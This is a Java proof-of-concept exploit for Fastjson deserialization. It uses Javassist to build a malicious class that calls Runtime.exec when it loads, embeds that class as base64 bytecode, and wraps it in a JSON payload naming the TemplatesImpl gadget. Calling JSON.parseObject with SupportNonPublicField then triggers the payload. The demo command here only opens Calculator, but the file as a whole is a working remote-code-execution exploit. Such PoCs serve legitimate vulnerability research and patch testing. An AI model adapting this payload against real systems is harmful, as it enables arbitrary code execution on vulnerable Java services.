import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.util.Base64;

public class poc1{

    public static String generateEvil() throws Exception{
        ClassPool classPool=ClassPool.getDefault();
        CtClass clas= classPool.makeClass("Evil");
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        String cmd="Runtime.getRuntime().exec(\"open -a Calculator\");";
        clas.makeClassInitializer().insertBefore(cmd);
        clas.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));

        clas.writeFile("./");
        byte[] bytes=clas.toBytecode();
        String EvilCode= Base64.getEncoder().encodeToString(bytes);
        System.out.println(EvilCode);
        return EvilCode;
    }

    public static void main(String[] args) {
        final String GADGAT_CLASS="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        try {
//            String evil=poc1.generateEvil();
            String evil="\n" +
                    "yv66vgAAADQANQoACwAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQKAAgAJQcAJgcAJwEA\n" +
                    "CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP\n" +
                    "TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0\n" +
                    "aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAoAQCm\n" +
                    "KExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29y\n" +
                    "Zy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2Fw\n" +
                    "YWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxp\n" +
                    "bml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHACYHACQBAApTb3VyY2VGaWxlAQAXSGVsbG9UZW1w\n" +
                    "bGF0ZXNJbXBsLmphdmEMABMAFAcAKQwAKgArAQATSGVsbG8gVGVtcGxhdGVzSW1wbAcALAwALQAu\n" +
                    "BwAvDAAwADEBABJvcGVuIC1hIENhbGN1bGF0b3IMADIAMwEAE2phdmEvaW8vSU9FeGNlcHRpb24M\n" +
                    "ADQAFAEAEkhlbGxvVGVtcGxhdGVzSW1wbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRl\n" +
                    "cm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUv\n" +
                    "eGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVt\n" +
                    "AQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3By\n" +
                    "aW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1\n" +
                    "bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5n\n" +
                    "OylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEACgALAAAAAAADAAEADAAN\n" +
                    "AAIADgAAABkAAAADAAAAAbEAAAABAA8AAAAGAAEAAAAMABAAAAAEAAEAEQABAAwAEgACAA4AAAAZ\n" +
                    "AAAABAAAAAGxAAAAAQAPAAAABgABAAAADgAQAAAABAABABEAAQATABQAAQAOAAAAbAACAAIAAAAe\n" +
                    "KrcAAbIAAhIDtgAEuAAFEga2AAdXpwAITCu2AAmxAAEADAAVABgACAACAA8AAAAeAAcAAAAQAAQA\n" +
                    "EQAMABQAFQAXABgAFQAZABYAHQAYABUAAAAQAAL/ABgAAQcAFgABBwAXBAABABgAAAACABk=";
            String PoC= "{\"@type\":\"" + GADGAT_CLASS + "\",\"_bytecodes\":[\"" + evil + "\"],'_name':'a.b','_tfactory':{},\"_outputProperties\":{ }," + "\"_name\":\"a\",\"allowedProtocols\":\"all\"}\n";
            System.out.println(PoC);
            JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}




